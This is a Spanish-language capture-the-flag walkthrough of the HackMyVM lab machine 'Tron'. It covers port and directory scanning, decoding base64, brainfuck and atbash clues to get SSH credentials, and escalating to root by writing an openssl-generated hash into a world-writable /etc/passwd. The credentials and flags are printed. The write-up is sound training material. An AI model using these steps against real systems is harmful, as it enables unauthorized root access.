---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Tron HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 02:16 EDT
Nmap scan report for 192.168.1.172
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:ed:64:93:84:b5:b2:e8:af:5a:0e:6f:52:af:4b:48 (RSA)
|   256 3d:df:6f:02:13:9e:15:f8:51:94:30:f8:45:e3:f2:93 (ECDSA)
|_  256 2f:f4:af:e1:f4:c4:a5:3b:50:bb:e5:b9:2a:9f:39:de (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Master Control Program
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:8B:31:4C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
```

Veremos que hay un puerto `80` levantado, por lo que si entramos en el veremos una pagina normal y corriente, vamos a realizar un poco de `fuzzing` para ver que podemos ver.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.172/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 309]
/.html                (Status: 403) [Size: 278]
/img                  (Status: 200) [Size: 936]
/manual               (Status: 200) [Size: 626]
/robots.txt           (Status: 200) [Size: 623]
/font                 (Status: 200) [Size: 935]
/.html                (Status: 403) [Size: 278]
/MCP                  (Status: 200) [Size: 1140]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos de todo esto una ruta bastante interesante llamada `/MCP` vamos a probar a entrar dentro de la misma.

Si entramos dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay varios archivos, pero si nos descargamos el archivo llamado `tron.txt` veremos lo siguiente:

```
MASTER CONTROL PROGRAM
----------------------

Ram:
Do you believe in the Users?

Crom:
Sure I do! If I didn't have a User, than who wrote me? 


KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==
```

Vemos que hay un codigo cifrado, por lo que vamos a intentar decodificarlo de la siguiente forma:

```shell
echo "KysrKysrKysrK1s+Kz4rKys+KysrKysrKz4rKysrKysrKysrPDw8PC1dPj4+PisrKysrKysrKysrKy4tLS0tLi0tLS0tLS0tLS0tLisrKysrKysrKysrKysrKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS0tLS4rKysrKysrKysrKysrLg==" | base64 -d
```

Info:

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++++.----.-----------.++++++++++++++++++++++++.--------------------.+++++++++++++.
```

Vemos que nos da otro codigo codificado que esta en formato `brainfuck` por lo que si lo decodificamos se quedara algo asi:

```
player
```

Vemos que sera un nombre de usuario, ahora si nos vamos a `terminalserver` -> `30513.txt` veremos esto:

```
substitute
--------------------------
plaintext
abcdefghijklmnopqrstuvwxyz

ciphertext
zyxwvutsrqponmlkjihgfedcba
--------------------------
```

Vemos que esto puede ser como un codigo para poder decodificar algo que este por ahi, por lo que vamos a investigar un poco.

Buscando un rato, si vamos a la pagina principal e inspeccionamos el codigo veremos lo siguiente:

```html
<!-- kzhh:SbWP9q94ZtE9qD  -->
```

Vamos a utilizar esto para aplicar la decodificacion de sustitucion con la palabra que encontramos a ver que vemos:

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado y la contraseña de `player` es `SyWP9j94ZgE9jD` por lo que vamos a conetcarnos por `SSH`.

### SSH

```shell
ssh player@<IP>
```

Metemos como contraseña `SyWP9j94ZgE9jD` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVMuserplayer2021
```

## Escalate Privileges

Despues de buscar un rato si hacemos lo siguiente:

```shell
find /etc -type f -writable 2>/dev/null
```

Info:

```
/etc/passwd
```

Veremos que podemos sobreescribir el archivo `passwd`, por lo que podremos hacer lo siguiente:

Antes codificaremos la contraseña para que la admita en el archivo `passwd`.

```shell
openssl passwd 1234
```

Info:

```
$1$YoLbOiy7$eDZyWwzWVII2TQyt3qjTH.
```

Ahora en la maquina victima vamos a establecerle dicha contraseña codificada a `root`.

```shell
nano /etc/passwd

#Dentro del nano
root:x:0:0:root:/root:/bin/bash #Pasamos de esto
root:$1$YoLbOiy7$eDZyWwzWVII2TQyt3qjTH.:0:0:root:/root:/bin/bash #<--------------- Ha esto
```

Lo guardamos y realizamos lo siguiente:

```shell
su root
```

Metemos como contraseña `1234` y veremos que seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMVMMasterControlProgram2021
```
